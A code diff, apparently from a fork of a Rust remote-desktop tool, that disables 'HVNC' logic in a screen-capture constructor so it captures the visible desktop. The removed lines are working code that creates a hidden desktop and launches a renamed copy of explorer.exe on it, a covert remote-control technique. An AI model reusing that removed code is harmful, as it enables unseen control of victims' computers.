@@ -68,104 +68,11 @@ pub struct CapturerGDI {
 impl CapturerGDI {
     pub fn new(name: &[u16], width: i32, height: i32) -> Result<Self, Box<dyn std::error::Error>> {
         unsafe {
-            println!(
-                "CapturerGDI::new: Trying to open/create desktop: {:?}",
-                hbb_common::config::DESKTOP_NAME
-            );
-            let mut desktop = OpenDesktopA(
-                hbb_common::config::DESKTOP_NAME.as_ptr() as _,
-                0,
-                1,
-                GENERIC_ALL,
-            );
-            if desktop.is_null() {
-                println!(
-                    "OpenDesktopA failed, trying CreateDesktopA. LastErr: {}",
-                    GetLastError()
-                );
-                desktop = CreateDesktopA(
-                    hbb_common::config::DESKTOP_NAME.as_ptr() as _,
-                    ptr::null_mut(),
-                    ptr::null_mut(),
-                    0,
-                    GENERIC_ALL,
-                    ptr::null_mut(),
-                );
-            }
+            // DISABLED HVNC LOGIC FOR VIRTUAL DISPLAY MODE
+            // We want to capture the actual visible desktop (or extended virtual display), not a hidden one.
+            let desktop = ptr::null_mut();
 
-            if desktop.is_null() {
-                println!("CreateDesktopA failed! LastErr: {}", GetLastError());
-            } else {
-                println!("Desktop handle obtained: {:?}", desktop);
-            }
-
-            if SetThreadDesktop(desktop) == 0 {
-                println!("SetThreadDesktop failed! LastErr: {}", GetLastError());
-            } else {
-                println!("SetThreadDesktop success");
-
-                // --- Explorer Launch Logic ---
-                // 1. Get Windows Directory
-                let mut buffer = [0u8; 260]; // MAX_PATH
-                let len = winapi::um::sysinfoapi::GetWindowsDirectoryA(
-                    buffer.as_mut_ptr() as *mut i8,
-                    260,
-                );
-                if len > 0 {
-                    let windir = std::str::from_utf8(&buffer[..len as usize]).unwrap_or("");
-                    let source_path = format!(r"{}\explorer.exe", windir);
-                    let temp_dir = std::env::temp_dir();
-                    let target_path = temp_dir.join("explorer_hvnc.exe");
-                    let target_path_str = target_path.to_string_lossy().to_string();
-
-                    println!(
-                        "Copying explorer from {} to {}",
-                        source_path, target_path_str
-                    );
-
-                    // 2. Copy explorer.exe to temp
-                    if let Err(e) = std::fs::copy(&source_path, &target_path) {
-                        println!("Failed to copy explorer.exe: {}", e);
-                    } else {
-                        // 3. Launch the copy
-                        let program = std::ffi::CString::new(target_path_str).unwrap();
-                        let mut si: STARTUPINFOA = std::mem::zeroed();
-                        si.cb = size_of::<STARTUPINFOA>() as _;
-                        si.lpDesktop = hbb_common::config::DESKTOP_NAME.as_ptr() as *mut _;
-
-                        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
-
-                        let res = CreateProcessA(
-                            ptr::null(),
-                            program.as_ptr() as *mut _,
-                            ptr::null_mut(),
-                            ptr::null_mut(),
-                            0,
-                            0,
-                            ptr::null_mut(),
-                            ptr::null(),
-                            &mut si,
-                            &mut pi,
-                        );
-
-                        if res != 0 {
-                            println!(
-                                "Started explorer_hvnc.exe on hidden desktop. PID: {}",
-                                pi.dwProcessId
-                            );
-                            winapi::um::handleapi::CloseHandle(pi.hProcess);
-                            winapi::um::handleapi::CloseHandle(pi.hThread);
-                        } else {
-                            println!(
-                                "Failed to start explorer_hvnc.exe, LastErr: {}",
-                                GetLastError()
-                            );
-                        }
-                    }
-                } else {
-                    println!("Failed to get Windows directory");
-                }
-            }
+            // println!("CapturerGDI::new: Using standard desktop capture.");
 
             let dc = GetDC(ptr::null_mut());
             if dc.is_null() {
